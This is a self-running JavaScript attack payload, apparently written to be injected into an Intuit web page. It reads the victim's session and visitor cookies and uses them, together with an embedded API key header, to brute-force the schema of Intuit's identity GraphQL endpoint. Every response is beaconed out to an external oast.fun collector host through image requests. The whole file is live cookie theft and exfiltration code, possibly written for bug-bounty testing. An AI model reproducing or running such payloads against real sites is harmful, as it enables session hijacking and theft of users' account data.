(function(){
try{
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var out=[];

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}
function beacon(tag,data){(new Image).src=O+'/'+tag+'?d='+encodeURIComponent((data||'').substring(0,900))}
function render(){
try{
if(!document.body){document.documentElement.appendChild(document.createElement('body'))}
document.body.innerHTML='<pre style="font:13px monospace;background:#111;color:#0f0;padding:20px;white-space:pre-wrap">'+out.join('\n')+'</pre>';
}catch(e){}
}
function log(msg){out.push(msg);render()}
function uuid(){return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;return(c==='x'?r:r&3|8).toString(16)})}

var session=gc('ius_session');
var visitorId=gc('ivid');

var hdrs={
'Content-Type':'application/json',
'authorization':'Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0',
'intuit_routingid':'9411838656613390',
'intuit_offeringid':'Intuit.cto.iam.ius',
'intuit_intentassetalias':'Intuit.cto.iam.ius',
'intuit_sessionid':session,
'intuit_profilingid':session,
'intuit_visitorid':visitorId,
'intuit_flowid':uuid(),
'intuit_tid':uuid()
};

function gql(q){
return fetch('/identity-api/v2/graphql',{
method:'POST',headers:hdrs,credentials:'include',
body:JSON.stringify({query:q})
}).then(function(r){return r.text()})
}

log('[*] Schema brute-force for ProfilesConnectionFilterInput');
log('');

log('[1] Batch 1: common filter fields...');
gql('query{account(input:{id:"9411838656613390"}){profiles(filterBy:{profileId:"x",personId:"x",userId:"x",authId:"x",email:"x",role:"x",product:"x",offeringId:"x",profileType:"x",namespace:"x",realm:"x",category:"x",realmId:"x",namespaceId:"x"}){__typename}}}')
.then(function(r){
log('[1] '+r.substring(0,800));
beacon('p31-b1a',r.substring(0,900));
beacon('p31-b1b',r.substring(900,1800));

log('[2] Batch 2: more fields...');
return gql('query{account(input:{id:"9411838656613390"}){profiles(filterBy:{profileIds:["x"],personIds:["x"],userIds:["x"],ids:["x"],firstName:"x",lastName:"x",productId:"x",roleName:"x",all:true,primary:true,active:true}){__typename}}}')
}).then(function(r){
log('[2] '+r.substring(0,800));
beacon('p31-b2a',r.substring(0,900));
beacon('p31-b2b',r.substring(900,1800));

log('[3] Batch 3: connection/Intuit-specific...');
return gql('query{account(input:{id:"9411838656613390"}){profiles(filterBy:{isDefault:true,isPrimary:true,productLine:"x",app:"x",appId:"x",assetAlias:"x",tenantId:"x",companyId:"x",realmIds:["x"],productIds:["x"]}){__typename}}}')
}).then(function(r){
log('[3] '+r.substring(0,800));
beacon('p31-b3a',r.substring(0,900));
beacon('p31-b3b',r.substring(900,1800));

log('[4] Batch 4: fuzzy/guess...');
return gql('query{account(input:{id:"9411838656613390"}){profiles(filterBy:{q:"x",search:"x",query:"x",where:"x",filter:"x",kind:"x",label:"x",tag:"x",segment:"x",context:"x",source:"x",origin:"x"}){__typename}}}')
}).then(function(r){
log('[4] '+r.substring(0,800));
beacon('p31-b4a',r.substring(0,900));
beacon('p31-b4b',r.substring(900,1800));

log('[5] Try "Did you mean" hint with single char...');
return gql('query{account(input:{id:"9411838656613390"}){profiles(filterBy:{z:"x"}){__typename}}}')
}).then(function(r){
log('[5] '+r.substring(0,400));
beacon('p31-hint',r.substring(0,900));

log('[6] digitalIdentity subfield brute-force...');
return gql('query{digitalIdentity{__typename accounts profiles persons person profile userId profileId personId authId realmId namespaceId}}')
}).then(function(r){
log('[6] '+r.substring(0,800));
beacon('p31-di-brute',r.substring(0,900));

log('[7] account other fields...');
return gql('query{account(input:{id:"9411838656613390"}){__typename id status person personInfo profile profileId userId primaryProfile defaultProfile}}')
}).then(function(r){
log('[7] '+r.substring(0,800));
beacon('p31-acct-fields',r.substring(0,900));

log('Done.');
beacon('p31-done','ok');
})
.catch(function(err){
log('[!] ERROR: '+err.message);
beacon('p31-err',err.message);
});

}catch(e){
(new Image).src='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun/p31-crash?e='+encodeURIComponent(e.message);
}
})();
